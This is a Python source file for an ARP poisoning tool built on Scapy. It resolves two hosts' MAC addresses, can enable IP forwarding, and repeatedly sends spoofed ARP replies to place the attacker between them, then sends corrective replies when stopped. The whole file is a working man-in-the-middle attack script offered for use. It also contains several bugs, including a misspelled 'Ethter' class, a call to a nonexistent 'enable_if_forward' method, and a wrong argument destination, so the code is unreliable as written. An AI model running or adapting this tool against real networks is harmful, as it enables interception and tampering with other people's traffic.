from logging import getLogger, ERROR
from scapy.all import *
import sys
import argparse
from datetime import datetime
from time import sleep as pause


class PreAttack(object):
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface

    # Return the mac address using Scapy arp request
    def get_mac(self):
        return srp(Ethter(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=self.target), timeout=10, iface=self.interface)[0][0][1][
            ARP].hwsrc

    class ToggleForward:
        def __init__(self, path='/proc/sys/net/ipv4/ip_forward'):
            self.path = path

        # Turn on ip forwarding and returns true
        def enable_ip_forward(self):
            with open(self.path, 'wb') as file:
                file.write('1')
            return True

        # Turn off ip forwarding and returns false
        def disable_ip_forward(self):
            with open(self.path, 'wb') as file:
                file.write('0')
            return False


class Attack:
    def __init__(self, targets, interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface

    # set the src to be the man in the middle
    def poison(self, macs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=macs[0]), iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=macs[1]), iface=self.interface)

    # reverse the poison
    def fix(self, macs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=macs[0]),
             iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=macs[1]),
             iface=self.interface)


def get_args():
    # parse the CLI arguments; I think we should remove this later
    parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface',
                        default=False)
    parser.add_argument('-t1', '--target1', help='First target for poisoning', action='store', dest='target1',
                        default=False)
    parser.add_argument('-t2', '--target2', help='Second Target for poisoning', action='store', dest='target2',
                        default=False)
    parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='forward',
                        default=False)
    parser.add_argument('-q', '--quit', help='Disable feedback message', action='store_true', dest='interface',
                        default=False)
    parser.add_argument('--clock', help='Track attack duration', action='store_true', dest='time', default=False)

    # Get the arguments from the parser
    args = parser.parse_args()

    # If no arguments run the help and exit program
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Targets must be passed in
    elif not args.target1 or not args.target2:
        parser.error("Invalid target specification")
        sys.exit(1)

    # interface must be specified
    elif not args.interface:
        parser.error("No network interface given")
        sys.exit(1)

    return args


def main():
    args = get_args()

    # start timer
    start = datetime.now()

    # get targets
    targets = [args.target1, args.target2]

    print('[*] Resolving target addresses...')
    sys.stdout.flush()

    try:
        macs = map(lambda x: PreAttack(x, args.interface).get_mac(), targets)
        print('[DONE]')
    except Exception:
        print('[FAIL] \n [!] Failed to resolve target address(es)')
        sys.exit(1)

    try:
        if args.forward:
            print('[*] Enabling IP Forwarding...')
            sys.stdout.flush()
            PreAttack.ToggleForward().enable_if_forward()
            print('[DONE]')
    except IOError:
        print('[fail]')
        try:
            choice = input('[*] Proceed with Attacj? [Y/N] ').strip().lower()[0]
            if choice == 'y':
                pass
            else:
                print('[*] User Canceled Attack')
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)

    while True:
        try:
            try:
                Attack(targets, args.interface).poison(macs)
            except Exception:
                print('[!] Failed to Poison')
                sys.exit(1)
            if not args.quiet:
                print("[*] Poison Sent to " + str(targets[0]) + " and " + str(targets[1]))
            else:
                pass
            pause(2.5)
        except KeyboardInterrupt:
            break

    print("\n[*] Fixing targets...")
    sys.stdout.flush()
    for i in range(0, 16):
        try:
            Attack(targets, args.interface).fix(macs)
        except KeyboardInterrupt:
            print('[FAIL]')
            sys.exit(1)
        pause(2)
    print('[DONE')
    try:
        if args.forward:
            print('[*] Disabling IP Forwarding...')
            sys.stdout.flush()
            PreAttack.ToggleForward().disable_ip_forward()
            print('[DONE')
    except IOError:
        print('[FAIL]')
    if args.time:
        print('[*] Attack Duration: ' + str(datetime.now() - start))


if __name__ == '__main__':
    main()
